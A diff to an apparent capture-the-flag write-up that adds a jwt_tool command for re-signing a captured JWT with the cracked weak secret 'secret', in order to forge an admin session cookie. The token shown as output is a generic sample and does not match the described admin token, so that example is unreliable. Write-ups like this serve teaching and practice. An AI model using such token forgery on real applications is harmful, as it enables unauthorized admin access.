@@ -47,7 +47,12 @@ Either way, the secret that will be spat out is ``secret``, which is super fitti
   
 Once we have the secret, we need to `sign` the JWT with the ADMIN user. This can be done using ``jwt_creator``   
 in the 'solutions_script' directory, by going to https://jwt.io with the secret and the value to modify with   
-or a plethora of other tools.   
-  
-With the secret in hand, set the value of the `session` cookie to be the newly created JWT. Now, when going to   
+or a plethora of other tools. An example with the 'jwt_tool' repo linked above is shown below: 
+```
+python3 jwt_tool.py  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVXNlciIsImZsYWciOiJmbGd7Y29uZ3JhdHVsYXRpb25zfSIsImlhdCI6MTYyMjg0MjA5NSwiZXhwIjoxNjIyODQ1Njk1fQ.W50C1U-y21usmuUFe_NO6lNWTTQUCDbL-DtCpNLR0E0 -S hs256 -p "secret"
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```
+
+With the newly signed JWT in hand, set the value of the `session` cookie to be the newly created JWT. Now, when going to   
 the 'admin' endpoint, you'll be greeted with the flag. 
